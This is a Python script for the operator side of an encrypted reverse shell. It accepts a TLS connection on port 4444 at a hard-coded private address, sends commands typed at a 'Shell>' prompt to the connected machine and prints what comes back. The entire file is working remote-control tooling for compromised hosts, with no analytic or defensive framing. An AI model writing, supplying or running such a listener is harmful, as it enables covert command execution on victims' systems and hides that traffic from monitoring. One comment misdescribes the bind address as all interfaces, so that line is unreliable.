import socket
import ssl

def start_server(host, port):
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile='server.pem', keyfile='server.pem')

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
    print(f'Listening on {host}:{port}...')

    conn, addr = server_socket.accept()
    connstream = context.wrap_socket(conn, server_side=True)
    print(f'Connection from {addr}')

    while True:
        command = input("Shell> ")
        if command.lower() in ['exit', 'quit']:
            connstream.send(b'exit')
            break
        connstream.send(command.encode() + b'\n')
        response = receive_data(connstream)
        print(response, end="")

    connstream.close()
    server_socket.close()

def receive_data(connstream):
    data = b""
    while True:
        part = connstream.recv(1024)
        data += part
        if len(part) < 1024:
            break
    return data.decode()

if __name__ == '__main__':
    HOST = '192.168.1.90'  # Listen on all available interfaces
    PORT = 4444  # Change to desired port
    start_server(HOST, PORT)
